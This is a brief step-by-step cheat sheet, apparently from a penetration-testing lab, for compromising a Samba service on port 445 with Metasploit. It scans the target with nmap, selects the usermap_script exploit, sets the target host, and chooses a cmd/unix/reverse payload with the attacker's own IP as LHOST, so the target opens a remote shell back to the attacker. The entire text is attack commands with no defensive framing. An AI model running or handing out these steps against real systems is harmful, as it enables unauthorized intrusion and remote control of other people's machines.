open msfconsole
 $ msfconsole
2. search for vulnerability of samba(port 445)
 $ nmap -sV <vulmachine-ip>
3. search for samba exploits based on version
 $ search samba
4. use exploit
 $ use exploit/multi/samba/usermap_script
 $ show options
 $ set RHOSTS <vuln-machine ip>
4. see payload options for the exploit
 $ show payloads
5. set payload
 $ set PAYLOAD cmd/unix/reverse
 $ show options
 $ set LHOST <my-ip>
 $ run/exploit